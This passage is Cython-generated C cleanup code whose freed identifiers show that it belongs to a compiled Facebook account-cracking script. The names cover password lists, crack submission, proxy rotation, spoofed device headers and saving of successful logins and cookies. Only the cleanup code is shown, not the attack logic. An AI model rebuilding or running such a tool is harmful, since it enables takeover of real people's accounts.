  Py_CLEAR(clear_module_state->__pyx_n_s_code);
  Py_CLEAR(clear_module_state->__pyx_n_s_coki);
  Py_CLEAR(clear_module_state->__pyx_kp_s_com_facebook_account_login_proto);
  Py_CLEAR(clear_module_state->__pyx_kp_s_com_facebook_katana);
  Py_CLEAR(clear_module_state->__pyx_n_s_community_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_concurrent_futures);
  Py_CLEAR(clear_module_state->__pyx_kp_s_content_type);
  Py_CLEAR(clear_module_state->__pyx_n_s_cookies);
  Py_CLEAR(clear_module_state->__pyx_n_s_cph);
  Py_CLEAR(clear_module_state->__pyx_n_s_cpl);
  Py_CLEAR(clear_module_state->__pyx_n_s_cps);
  Py_CLEAR(clear_module_state->__pyx_n_s_crack_submit);
  Py_CLEAR(clear_module_state->__pyx_n_s_credentials_type);
  Py_CLEAR(clear_module_state->__pyx_kp_s_credentials_type_device_based_l);
  Py_CLEAR(clear_module_state->__pyx_n_s_crk);
  Py_CLEAR(clear_module_state->__pyx_n_s_cudiua1);
  Py_CLEAR(clear_module_state->__pyx_n_s_cudiua2);
  Py_CLEAR(clear_module_state->__pyx_n_s_cudiua3);
  Py_CLEAR(clear_module_state->__pyx_n_s_cudiua4);
  Py_CLEAR(clear_module_state->__pyx_n_s_cudiua5);
  Py_CLEAR(clear_module_state->__pyx_n_s_cudiua6);
  Py_CLEAR(clear_module_state->__pyx_n_s_cudiua7);
  Py_CLEAR(clear_module_state->__pyx_n_s_cudiua8);
  Py_CLEAR(clear_module_state->__pyx_n_s_currently_logged_in_userid);
  Py_CLEAR(clear_module_state->__pyx_n_s_cx);
  Py_CLEAR(clear_module_state->__pyx_n_s_cz);
  Py_CLEAR(clear_module_state->__pyx_n_s_data);
  Py_CLEAR(clear_module_state->__pyx_kp_s_data_data_com_termux_files_usr);
  Py_CLEAR(clear_module_state->__pyx_n_s_date);
  Py_CLEAR(clear_module_state->__pyx_n_s_datetime);
  Py_CLEAR(clear_module_state->__pyx_n_s_day);
  Py_CLEAR(clear_module_state->__pyx_n_s_decode);
  Py_CLEAR(clear_module_state->__pyx_kp_s_density_2_25_height);
  Py_CLEAR(clear_module_state->__pyx_n_s_device);
  Py_CLEAR(clear_module_state->__pyx_n_s_device_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_dic);
  Py_CLEAR(clear_module_state->__pyx_n_s_dic2);
  Py_CLEAR(clear_module_state->__pyx_n_s_digits);
  Py_CLEAR(clear_module_state->__pyx_kp_u_disable);
  Py_CLEAR(clear_module_state->__pyx_n_s_document);
  Py_CLEAR(clear_module_state->__pyx_n_s_dpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_e);
  Py_CLEAR(clear_module_state->__pyx_n_s_email);
  Py_CLEAR(clear_module_state->__pyx_kp_s_en_BD_en_GB_q_0_9_en_US_q_0_8_en);
  Py_CLEAR(clear_module_state->__pyx_n_s_en_GB);
  Py_CLEAR(clear_module_state->__pyx_kp_u_enable);
  Py_CLEAR(clear_module_state->__pyx_n_s_enroll_misauth);
  Py_CLEAR(clear_module_state->__pyx_n_s_enter);
  Py_CLEAR(clear_module_state->__pyx_n_s_error);
  Py_CLEAR(clear_module_state->__pyx_n_s_error_detail_type);
  Py_CLEAR(clear_module_state->__pyx_n_s_error_msg);
  Py_CLEAR(clear_module_state->__pyx_n_s_exceptions);
  Py_CLEAR(clear_module_state->__pyx_n_s_exit);
  Py_CLEAR(clear_module_state->__pyx_n_s_exit_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_false);
  Py_CLEAR(clear_module_state->__pyx_n_s_family);
  Py_CLEAR(clear_module_state->__pyx_n_s_family_device_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_fb_api_caller_class);
  Py_CLEAR(clear_module_state->__pyx_n_s_fb_api_req_friendly_name);
  Py_CLEAR(clear_module_state->__pyx_n_s_fban);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbav);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbbd);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbbv);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbca);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbcr);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbdm);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbdv);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbfw);
  Py_CLEAR(clear_module_state->__pyx_n_s_fblc);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbmf);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbpn);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbrv);
  Py_CLEAR(clear_module_state->__pyx_n_s_fbsv);
  Py_CLEAR(clear_module_state->__pyx_n_s_file);
  Py_CLEAR(clear_module_state->__pyx_n_s_findall);
  Py_CLEAR(clear_module_state->__pyx_n_s_first);
  Py_CLEAR(clear_module_state->__pyx_n_s_flush);
  Py_CLEAR(clear_module_state->__pyx_n_s_fn);
  Py_CLEAR(clear_module_state->__pyx_n_s_fo);
  Py_CLEAR(clear_module_state->__pyx_n_s_format);
  Py_CLEAR(clear_module_state->__pyx_n_s_free_fb);
  Py_CLEAR(clear_module_state->__pyx_kp_u_gc);
  Py_CLEAR(clear_module_state->__pyx_n_s_generate_analytics_claims);
  Py_CLEAR(clear_module_state->__pyx_n_s_generate_machine_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_generate_session_cookies);
  Py_CLEAR(clear_module_state->__pyx_n_s_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_get);
  Py_CLEAR(clear_module_state->__pyx_n_s_get_dict);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_gsm_operator_alpha);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_ro_build_id);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_ro_build_version_release);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_ro_hwui_text_large_cache);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_ro_hwui_text_large_cache_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_ro_product_brand);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_ro_product_cpu_abilist);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_ro_product_manufacturer);
  Py_CLEAR(clear_module_state->__pyx_kp_s_getprop_ro_product_model);
  Py_CLEAR(clear_module_state->__pyx_n_s_getuid);
  Py_CLEAR(clear_module_state->__pyx_n_s_group);
  Py_CLEAR(clear_module_state->__pyx_kp_s_gzip_deflate);
  Py_CLEAR(clear_module_state->__pyx_n_s_hash_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_hashlib);
  Py_CLEAR(clear_module_state->__pyx_n_s_head);
  Py_CLEAR(clear_module_state->__pyx_n_s_headers);
  Py_CLEAR(clear_module_state->__pyx_n_s_hexdigits);
  Py_CLEAR(clear_module_state->__pyx_n_s_https);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_api_facebook_com_method_au);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_api_proxyscrape_com_reques);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_api_proxyscrape_com_v2_req);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_fgsrsvb_blogspot_com_2024);
  Py_CLEAR(clear_module_state->__pyx_kp_u_https_graph_facebook_com);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_graph_facebook_com_auth_lo);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_graph_facebook_com_method);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_mbasic_facebook_com);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_mbasic_facebook_com_login);
  Py_CLEAR(clear_module_state->__pyx_kp_s_https_raw_githubusercontent_com);
  Py_CLEAR(clear_module_state->__pyx_n_s_httpx);
  Py_CLEAR(clear_module_state->__pyx_n_s_i);
  Py_CLEAR(clear_module_state->__pyx_n_s_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_idpaslogin);
  Py_CLEAR(clear_module_state->__pyx_n_s_ids);
  Py_CLEAR(clear_module_state->__pyx_n_s_import);
  Py_CLEAR(clear_module_state->__pyx_n_s_initializing);
  Py_CLEAR(clear_module_state->__pyx_n_s_input);
  Py_CLEAR(clear_module_state->__pyx_n_s_is_coroutine);
  Py_CLEAR(clear_module_state->__pyx_kp_u_isenabled);
  Py_CLEAR(clear_module_state->__pyx_n_s_items);
  Py_CLEAR(clear_module_state->__pyx_n_s_j1);
  Py_CLEAR(clear_module_state->__pyx_n_s_jazoest);
  Py_CLEAR(clear_module_state->__pyx_n_s_join);
  Py_CLEAR(clear_module_state->__pyx_n_s_json);
  Py_CLEAR(clear_module_state->__pyx_n_s_k);
  Py_CLEAR(clear_module_state->__pyx_n_s_key);
  Py_CLEAR(clear_module_state->__pyx_n_s_keys);
  Py_CLEAR(clear_module_state->__pyx_n_s_kiron);
  Py_CLEAR(clear_module_state->__pyx_n_s_kkkkki);
  Py_CLEAR(clear_module_state->__pyx_n_s_last);
  Py_CLEAR(clear_module_state->__pyx_n_s_li);
  Py_CLEAR(clear_module_state->__pyx_n_s_li2);
  Py_CLEAR(clear_module_state->__pyx_n_s_light);
  Py_CLEAR(clear_module_state->__pyx_n_s_limit);
  Py_CLEAR(clear_module_state->__pyx_n_s_linex);
  Py_CLEAR(clear_module_state->__pyx_n_s_ln);
  Py_CLEAR(clear_module_state->__pyx_n_s_locale);
  Py_CLEAR(clear_module_state->__pyx_n_s_localtime);
  Py_CLEAR(clear_module_state->__pyx_n_s_log_cookies);
  Py_CLEAR(clear_module_state->__pyx_n_s_logged_out_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_login);
  Py_CLEAR(clear_module_state->__pyx_n_s_logo);
  Py_CLEAR(clear_module_state->__pyx_n_s_loop);
  Py_CLEAR(clear_module_state->__pyx_n_s_love);
  Py_CLEAR(clear_module_state->__pyx_n_s_lower);
  Py_CLEAR(clear_module_state->__pyx_n_s_lsd);
  Py_CLEAR(clear_module_state->__pyx_n_s_lt);
  Py_CLEAR(clear_module_state->__pyx_n_s_ltx);
  Py_CLEAR(clear_module_state->__pyx_n_s_m_ts);
  Py_CLEAR(clear_module_state->__pyx_n_s_main);
  Py_CLEAR(clear_module_state->__pyx_n_s_mal);
  Py_CLEAR(clear_module_state->__pyx_n_s_math);
  Py_CLEAR(clear_module_state->__pyx_kp_s_max_age_0);
  Py_CLEAR(clear_module_state->__pyx_n_s_max_workers);
  Py_CLEAR(clear_module_state->__pyx_kp_s_mbasic_facebook_com);
  Py_CLEAR(clear_module_state->__pyx_n_s_menu);
  Py_CLEAR(clear_module_state->__pyx_n_s_message);
  Py_CLEAR(clear_module_state->__pyx_n_s_meta_inf_fbmeta);
  Py_CLEAR(clear_module_state->__pyx_n_s_method);
  Py_CLEAR(clear_module_state->__pyx_n_s_mkdir);
  Py_CLEAR(clear_module_state->__pyx_n_s_mmm);
  Py_CLEAR(clear_module_state->__pyx_n_s_mmmm);
  Py_CLEAR(clear_module_state->__pyx_n_s_mmmmm);
  Py_CLEAR(clear_module_state->__pyx_n_s_mmp);
  Py_CLEAR(clear_module_state->__pyx_n_s_mobile);
  Py_CLEAR(clear_module_state->__pyx_kp_s_mod_txt);
  Py_CLEAR(clear_module_state->__pyx_n_s_model);
  Py_CLEAR(clear_module_state->__pyx_n_s_moe);
  Py_CLEAR(clear_module_state->__pyx_n_s_month);
  Py_CLEAR(clear_module_state->__pyx_n_s_motorola);
  Py_CLEAR(clear_module_state->__pyx_n_s_mthd);
  Py_CLEAR(clear_module_state->__pyx_n_s_n);
  Py_CLEAR(clear_module_state->__pyx_n_s_name);
  Py_CLEAR(clear_module_state->__pyx_n_s_name_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_name_jazoest_value);
  Py_CLEAR(clear_module_state->__pyx_kp_s_name_li_value);
  Py_CLEAR(clear_module_state->__pyx_kp_s_name_lsd_value);
  Py_CLEAR(clear_module_state->__pyx_kp_s_name_m_ts_value);
  Py_CLEAR(clear_module_state->__pyx_n_s_names);
  Py_CLEAR(clear_module_state->__pyx_n_s_navigate);
  Py_CLEAR(clear_module_state->__pyx_n_s_network_country);
  Py_CLEAR(clear_module_state->__pyx_n_s_none);
  Py_CLEAR(clear_module_state->__pyx_n_s_now);
  Py_CLEAR(clear_module_state->__pyx_n_s_oks);
  Py_CLEAR(clear_module_state->__pyx_n_s_old);
  Py_CLEAR(clear_module_state->__pyx_n_s_open);
  Py_CLEAR(clear_module_state->__pyx_n_s_os);
  Py_CLEAR(clear_module_state->__pyx_n_s_pas);
  Py_CLEAR(clear_module_state->__pyx_n_s_pass);
  Py_CLEAR(clear_module_state->__pyx_n_s_passlist);
  Py_CLEAR(clear_module_state->__pyx_kp_s_password);
  Py_CLEAR(clear_module_state->__pyx_n_s_password_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_path);
  Py_CLEAR(clear_module_state->__pyx_n_s_pcp);
  Py_CLEAR(clear_module_state->__pyx_kp_u_picture_type_normal);
  Py_CLEAR(clear_module_state->__pyx_n_s_pip);
  Py_CLEAR(clear_module_state->__pyx_kp_s_pip_install_requests_futures_2_d);
  Py_CLEAR(clear_module_state->__pyx_n_s_platform);
  Py_CLEAR(clear_module_state->__pyx_n_s_plist);
  Py_CLEAR(clear_module_state->__pyx_n_s_po);
  Py_CLEAR(clear_module_state->__pyx_n_s_post);
  Py_CLEAR(clear_module_state->__pyx_n_s_print);
  Py_CLEAR(clear_module_state->__pyx_n_s_proxsi);
  Py_CLEAR(clear_module_state->__pyx_kp_s_proxy_txt);
  Py_CLEAR(clear_module_state->__pyx_n_s_proxylist);
  Py_CLEAR(clear_module_state->__pyx_n_s_ps);
  Py_CLEAR(clear_module_state->__pyx_n_s_ps_limit);
  Py_CLEAR(clear_module_state->__pyx_n_s_pw);
  Py_CLEAR(clear_module_state->__pyx_kp_s_python_AYYUB_py);
  Py_CLEAR(clear_module_state->__pyx_n_s_r);
  Py_CLEAR(clear_module_state->__pyx_n_s_randint);
  Py_CLEAR(clear_module_state->__pyx_n_s_random);
  Py_CLEAR(clear_module_state->__pyx_n_s_random_seed);
  Py_CLEAR(clear_module_state->__pyx_n_s_randrange);
  Py_CLEAR(clear_module_state->__pyx_n_s_range);
  Py_CLEAR(clear_module_state->__pyx_n_s_rc);
  Py_CLEAR(clear_module_state->__pyx_n_s_re);
  Py_CLEAR(clear_module_state->__pyx_n_s_read);
  Py_CLEAR(clear_module_state->__pyx_n_s_redmi);
  Py_CLEAR(clear_module_state->__pyx_n_s_reg_instance);
  Py_CLEAR(clear_module_state->__pyx_n_s_regular);
  Py_CLEAR(clear_module_state->__pyx_n_s_replace);
  Py_CLEAR(clear_module_state->__pyx_n_s_requests);
  Py_CLEAR(clear_module_state->__pyx_n_s_res);
  Py_CLEAR(clear_module_state->__pyx_n_s_resrr);
  Py_CLEAR(clear_module_state->__pyx_n_s_ress);
  Py_CLEAR(clear_module_state->__pyx_n_s_rnd);
  Py_CLEAR(clear_module_state->__pyx_n_s_rp);
  Py_CLEAR(clear_module_state->__pyx_n_s_rr);
  Py_CLEAR(clear_module_state->__pyx_n_s_scheme);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_AYYUB);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_AYYUB_CP_txt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_AYYUB_FILE_M1_OK_txt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_AYYUB_FILE_M2_OK_txt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_AYYUB_OLD_txt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_AYYUB_RND_CP_txt);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_AYYUB_RND_M1_OK_COKIE_tx);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sdcard_kiron_py);
  Py_CLEAR(clear_module_state->__pyx_n_s_se);
  Py_CLEAR(clear_module_state->__pyx_n_s_search);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_prefers_color_scheme);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_ua);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_ua_full_version_list);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_ua_mobile);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_ch_ua_platform);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_fetch_dest);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_fetch_mode);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_fetch_site);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sec_fetch_user);
  Py_CLEAR(clear_module_state->__pyx_n_s_secure);
  Py_CLEAR(clear_module_state->__pyx_n_s_select);
  Py_CLEAR(clear_module_state->__pyx_n_s_send);
  Py_CLEAR(clear_module_state->__pyx_n_s_ses);
  Py_CLEAR(clear_module_state->__pyx_n_s_session);
  Py_CLEAR(clear_module_state->__pyx_n_s_session_cookies);
  Py_CLEAR(clear_module_state->__pyx_n_s_session_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_session_key);
  Py_CLEAR(clear_module_state->__pyx_kp_s_sessions_py);
  Py_CLEAR(clear_module_state->__pyx_n_s_sexkey);
  Py_CLEAR(clear_module_state->__pyx_n_s_shell);
  Py_CLEAR(clear_module_state->__pyx_n_s_sim_country);
  Py_CLEAR(clear_module_state->__pyx_n_s_sim_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_sim_serials);
  Py_CLEAR(clear_module_state->__pyx_n_s_sleep);
  Py_CLEAR(clear_module_state->__pyx_n_s_smtplib);
  Py_CLEAR(clear_module_state->__pyx_kp_s_socksku_txt);
  Py_CLEAR(clear_module_state->__pyx_n_s_source);
  Py_CLEAR(clear_module_state->__pyx_n_s_spec);
  Py_CLEAR(clear_module_state->__pyx_n_s_split);
  Py_CLEAR(clear_module_state->__pyx_n_s_splitlines);
  Py_CLEAR(clear_module_state->__pyx_n_s_ssbb);
  Py_CLEAR(clear_module_state->__pyx_n_s_star);
  Py_CLEAR(clear_module_state->__pyx_n_s_stdout);
  Py_CLEAR(clear_module_state->__pyx_n_s_string);
  Py_CLEAR(clear_module_state->__pyx_n_s_submit);
  Py_CLEAR(clear_module_state->__pyx_n_s_subprocess);
  Py_CLEAR(clear_module_state->__pyx_kp_u_swan_mibrowser);
  Py_CLEAR(clear_module_state->__pyx_n_s_sys);
  Py_CLEAR(clear_module_state->__pyx_n_s_system);
  Py_CLEAR(clear_module_state->__pyx_n_s_tag);
  Py_CLEAR(clear_module_state->__pyx_n_s_test);
  Py_CLEAR(clear_module_state->__pyx_n_s_text);
  Py_CLEAR(clear_module_state->__pyx_kp_s_text_html_application_xhtml_xml);
  Py_CLEAR(clear_module_state->__pyx_n_s_tgl);
  Py_CLEAR(clear_module_state->__pyx_n_s_thn);
  Py_CLEAR(clear_module_state->__pyx_n_s_throw);
  Py_CLEAR(clear_module_state->__pyx_n_s_tier);
  Py_CLEAR(clear_module_state->__pyx_n_s_time);
  Py_CLEAR(clear_module_state->__pyx_n_s_tks);
  Py_CLEAR(clear_module_state->__pyx_n_s_tl);
  Py_CLEAR(clear_module_state->__pyx_n_s_tokenku);
  Py_CLEAR(clear_module_state->__pyx_n_s_total);
  Py_CLEAR(clear_module_state->__pyx_n_s_total_ids);
  Py_CLEAR(clear_module_state->__pyx_n_s_tred);
  Py_CLEAR(clear_module_state->__pyx_n_s_true);
  Py_CLEAR(clear_module_state->__pyx_n_s_try_num);
  Py_CLEAR(clear_module_state->__pyx_n_s_try_number);
  Py_CLEAR(clear_module_state->__pyx_n_s_twf);
  Py_CLEAR(clear_module_state->__pyx_n_s_ua);
  Py_CLEAR(clear_module_state->__pyx_n_s_uid);
  Py_CLEAR(clear_module_state->__pyx_n_s_uidx);
  Py_CLEAR(clear_module_state->__pyx_n_s_unknown);
  Py_CLEAR(clear_module_state->__pyx_n_s_uno);
  Py_CLEAR(clear_module_state->__pyx_n_s_unrecognized_tries);
  Py_CLEAR(clear_module_state->__pyx_kp_s_upgrade_insecure_requests);
  Py_CLEAR(clear_module_state->__pyx_n_s_urandom);
  Py_CLEAR(clear_module_state->__pyx_n_s_url);
  Py_CLEAR(clear_module_state->__pyx_n_s_urllib);
  Py_CLEAR(clear_module_state->__pyx_n_s_urllib3);
  Py_CLEAR(clear_module_state->__pyx_n_s_urllib_request);
  Py_CLEAR(clear_module_state->__pyx_n_s_urlopen);
  Py_CLEAR(clear_module_state->__pyx_n_s_us);
  Py_CLEAR(clear_module_state->__pyx_n_s_user);
  Py_CLEAR(clear_module_state->__pyx_kp_s_user_agent);
  Py_CLEAR(clear_module_state->__pyx_n_s_usergent);
  Py_CLEAR(clear_module_state->__pyx_kp_s_utf_8);
  Py_CLEAR(clear_module_state->__pyx_n_s_uuid);
  Py_CLEAR(clear_module_state->__pyx_n_s_uuid4);
  Py_CLEAR(clear_module_state->__pyx_n_s_value);
  Py_CLEAR(clear_module_state->__pyx_n_s_verify);
  Py_CLEAR(clear_module_state->__pyx_kp_s_viewport_width);
  Py_CLEAR(clear_module_state->__pyx_n_s_w);
  Py_CLEAR(clear_module_state->__pyx_kp_s_width);
  Py_CLEAR(clear_module_state->__pyx_n_s_windows);
  Py_CLEAR(clear_module_state->__pyx_n_s_write);
  Py_CLEAR(clear_module_state->__pyx_kp_s_www_facebook_com);
  Py_CLEAR(clear_module_state->__pyx_n_s_x);
  Py_CLEAR(clear_module_state->__pyx_kp_s_x_fb_connection_bandwidth);
  Py_CLEAR(clear_module_state->__pyx_kp_s_x_fb_connection_quality);
  Py_CLEAR(clear_module_state->__pyx_kp_s_x_fb_connection_type);
  Py_CLEAR(clear_module_state->__pyx_kp_s_x_fb_http_engine);
  Py_CLEAR(clear_module_state->__pyx_kp_s_x_fb_net_hni);
  Py_CLEAR(clear_module_state->__pyx_kp_s_x_fb_sim_hni);
  Py_CLEAR(clear_module_state->__pyx_n_s_xd);
  Py_CLEAR(clear_module_state->__pyx_kp_s_xdg_open_https_wa_me_88019097655);
  Py_CLEAR(clear_module_state->__pyx_kp_s_xdg_open_https_www_facebook_com);
  Py_CLEAR(clear_module_state->__pyx_n_s_y);
  Py_CLEAR(clear_module_state->__pyx_n_s_year);
  Py_CLEAR(clear_module_state->__pyx_n_s_yes);
  Py_CLEAR(clear_module_state->__pyx_n_s_zlib);
  Py_CLEAR(clear_module_state->__pyx_float_2e7);
  Py_CLEAR(clear_module_state->__pyx_float_3e7);
  Py_CLEAR(clear_module_state->__pyx_float_20000000_0);
  Py_CLEAR(clear_module_state->__pyx_float_30000000_0);
  Py_CLEAR(clear_module_state->__pyx_int_0);
  Py_CLEAR(clear_module_state->__pyx_int_1);
  Py_CLEAR(clear_module_state->__pyx_int_2);
  Py_CLEAR(clear_module_state->__pyx_int_3);
  Py_CLEAR(clear_module_state->__pyx_int_4);
  Py_CLEAR(clear_module_state->__pyx_int_5);
  Py_CLEAR(clear_module_state->__pyx_int_6);
  Py_CLEAR(clear_module_state->__pyx_int_7);
  Py_CLEAR(clear_module_state->__pyx_int_8);
  Py_CLEAR(clear_module_state->__pyx_int_9);
  Py_CLEAR(clear_module_state->__pyx_int_10);
  Py_CLEAR(clear_module_state->__pyx_int_11);
  Py_CLEAR(clear_module_state->__pyx_int_12);
  Py_CLEAR(clear_module_state->__pyx_int_13);
  Py_CLEAR(clear_module_state->__pyx_int_16);
  Py_CLEAR(clear_module_state->__pyx_int_17);
  Py_CLEAR(clear_module_state->__pyx_int_18);
  Py_CLEAR(clear_module_state->__pyx_int_19);
  Py_CLEAR(clear_module_state->__pyx_int_20);
  Py_CLEAR(clear_module_state->__pyx_int_30);
  Py_CLEAR(clear_module_state->__pyx_int_34);
  Py_CLEAR(clear_module_state->__pyx_int_36);
  Py_CLEAR(clear_module_state->__pyx_int_38);
  Py_CLEAR(clear_module_state->__pyx_int_39);
  Py_CLEAR(clear_module_state->__pyx_int_40);
  Py_CLEAR(clear_module_state->__pyx_int_42);
  Py_CLEAR(clear_module_state->__pyx_int_44);
  Py_CLEAR(clear_module_state->__pyx_int_49);
  Py_CLEAR(clear_module_state->__pyx_int_59);
  Py_CLEAR(clear_module_state->__pyx_int_77);
  Py_CLEAR(clear_module_state->__pyx_int_89);
  Py_CLEAR(clear_module_state->__pyx_int_99);
  Py_CLEAR(clear_module_state->__pyx_int_110);
  Py_CLEAR(clear_module_state->__pyx_int_111);
  Py_CLEAR(clear_module_state->__pyx_int_120);
  Py_CLEAR(clear_module_state->__pyx_int_311);
  Py_CLEAR(clear_module_state->__pyx_int_499);
  Py_CLEAR(clear_module_state->__pyx_int_511);
  Py_CLEAR(clear_module_state->__pyx_int_552);
  Py_CLEAR(clear_module_state->__pyx_int_599);
  Py_CLEAR(clear_module_state->__pyx_int_661);
  Py_CLEAR(clear_module_state->__pyx_int_742);
  Py_CLEAR(clear_module_state->__pyx_int_999);
  Py_CLEAR(clear_module_state->__pyx_int_1111);
  Py_CLEAR(clear_module_state->__pyx_int_2200);
  Py_CLEAR(clear_module_state->__pyx_int_7120);
  Py_CLEAR(clear_module_state->__pyx_int_7999);
  Py_CLEAR(clear_module_state->__pyx_int_9999);
  Py_CLEAR(clear_module_state->__pyx_int_11111);
  Py_CLEAR(clear_module_state->__pyx_int_20000);
  Py_CLEAR(clear_module_state->__pyx_int_40000);
  Py_CLEAR(clear_module_state->__pyx_int_66666);
  Py_CLEAR(clear_module_state->__pyx_int_99999);
  Py_CLEAR(clear_module_state->__pyx_int_111111);
  Py_CLEAR(clear_module_state->__pyx_int_199999);
  Py_CLEAR(clear_module_state->__pyx_int_900000);
  Py_CLEAR(clear_module_state->__pyx_int_999999);
  Py_CLEAR(clear_module_state->__pyx_int_1111111);
  Py_CLEAR(clear_module_state->__pyx_int_7777777);
  Py_CLEAR(clear_module_state->__pyx_int_20000000);
  Py_CLEAR(clear_module_state->__pyx_int_30000000);
  Py_CLEAR(clear_module_state->__pyx_int_100000000);
  Py_CLEAR(clear_module_state->__pyx_int_111111111);
  Py_CLEAR(clear_module_state->__pyx_int_999999999);
  Py_CLEAR(clear_module_state->__pyx_int_1000000000);
  Py_CLEAR(clear_module_state->__pyx_int_9999999999);
  Py_CLEAR(clear_module_state->__pyx_tuple_);
  Py_CLEAR(clear_module_state->__pyx_tuple__2);
  Py_CLEAR(clear_module_state->__pyx_tuple__3);
  Py_CLEAR(clear_module_state->__pyx_tuple__4);
  Py_CLEAR(clear_module_state->__pyx_tuple__5);
  Py_CLEAR(clear_module_state->__pyx_tuple__6);
  Py_CLEAR(clear_module_state->__pyx_tuple__7);
  Py_CLEAR(clear_module_state->__pyx_tuple__8);
  Py_CLEAR(clear_module_state->__pyx_tuple__9);
  Py_CLEAR(clear_module_state->__pyx_slice__65);
  Py_CLEAR(clear_module_state->__pyx_slice__66);
  Py_CLEAR(clear_module_state->__pyx_slice__67);
  Py_CLEAR(clear_module_state->__pyx_tuple__10);
  Py_CLEAR(clear_module_state->__pyx_tuple__12);
  Py_CLEAR(clear_module_state->__pyx_tuple__13);
  Py_CLEAR(clear_module_state->__pyx_tuple__14);
  Py_CLEAR(clear_module_state->__pyx_tuple__15);
  Py_CLEAR(clear_module_state->__pyx_tuple__16);
  Py_CLEAR(clear_module_state->__pyx_tuple__17);
  Py_CLEAR(clear_module_state->__pyx_tuple__18);
  Py_CLEAR(clear_module_state->__pyx_tuple__19);
  Py_CLEAR(clear_module_state->__pyx_tuple__20);
  Py_CLEAR(clear_module_state->__pyx_tuple__21);
  Py_CLEAR(clear_module_state->__pyx_tuple__22);
  Py_CLEAR(clear_module_state->__pyx_tuple__23);
  Py_CLEAR(clear_module_state->__pyx_tuple__24);
  Py_CLEAR(clear_module_state->__pyx_tuple__26);
  Py_CLEAR(clear_module_state->__pyx_tuple__27);
  Py_CLEAR(clear_module_state->__pyx_tuple__28);
  Py_CLEAR(clear_module_state->__pyx_tuple__29);
  Py_CLEAR(clear_module_state->__pyx_tuple__30);
  Py_CLEAR(clear_module_state->__pyx_tuple__31);
  Py_CLEAR(clear_module_state->__pyx_tuple__34);
  Py_CLEAR(clear_module_state->__pyx_tuple__35);
  Py_CLEAR(clear_module_state->__pyx_tuple__36);
  Py_CLEAR(clear_module_state->__pyx_tuple__37);
  Py_CLEAR(clear_module_state->__pyx_tuple__39);
  Py_CLEAR(clear_module_state->__pyx_tuple__40);
  Py_CLEAR(clear_module_state->__pyx_tuple__41);
  Py_CLEAR(clear_module_state->__pyx_tuple__42);
  Py_CLEAR(clear_module_state->__pyx_tuple__43);
  Py_CLEAR(clear_module_state->__pyx_tuple__44);
  Py_CLEAR(clear_module_state->__pyx_tuple__45);
  Py_CLEAR(clear_module_state->__pyx_tuple__46);
  Py_CLEAR(clear_module_state->__pyx_tuple__47);
  Py_CLEAR(clear_module_state->__pyx_tuple__49);
  Py_CLEAR(clear_module_state->__pyx_tuple__50);
  Py_CLEAR(clear_module_state->__pyx_tuple__51);
  Py_CLEAR(clear_module_state->__pyx_tuple__52);
  Py_CLEAR(clear_module_state->__pyx_tuple__53);
  Py_CLEAR(clear_module_state->__pyx_tuple__55);
  Py_CLEAR(clear_module_state->__pyx_tuple__56);
  Py_CLEAR(clear_module_state->__pyx_tuple__57);
  Py_CLEAR(clear_module_state->__pyx_tuple__58);
  Py_CLEAR(clear_module_state->__pyx_tuple__59);
  Py_CLEAR(clear_module_state->__pyx_tuple__60);
  Py_CLEAR(clear_module_state->__pyx_tuple__61);
  Py_CLEAR(clear_module_state->__pyx_tuple__62);
